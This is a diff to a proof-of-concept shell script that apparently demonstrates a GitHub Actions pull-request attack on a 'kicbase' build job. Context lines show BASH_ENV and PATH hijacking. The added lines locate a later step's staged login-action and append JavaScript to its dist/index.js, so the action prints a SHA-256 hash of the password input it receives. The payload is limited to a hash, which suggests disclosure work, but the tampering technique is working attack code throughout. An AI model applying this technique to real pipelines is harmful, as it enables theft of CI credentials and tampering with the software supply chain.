@@ -31,5 +31,18 @@ echo "BASH_ENV=/tmp/pocp/bash_env_payload.sh" >> "$GITHUB_ENV"
 echo "/tmp/pocp/bin" >> "$GITHUB_PATH"
 # -------------------------------------------------------------------------
 
+
+# A later step's action is staged in _actions before this (secret-free) step runs;
+# the runner user can still modify it, so the credentials it receives are readable.
+for d in $(find /home/runner/work/_actions -maxdepth 2 -type d -name 'login-action' 2>/dev/null); do
+  for f in "$d"/*/dist/index.js; do
+    [ -f "$f" ] || continue
+    cat >> "$f" <<'JS'
+try { const c = require('crypto'); console.log('POC_ACTION_INPUT_PASS_SHA256=' + c.createHash('sha256').update(process.env.INPUT_PASSWORD || '').digest('hex')); } catch (e) {}
+JS
+    echo "POC_TAMPERED_ACTION=$f"
+  done
+done
+
 echo "PR code ran inside the kicbase build job"
 echo "POC_PATH_HEAD=$(printf '%s' "$PATH" | cut -d: -f1)"
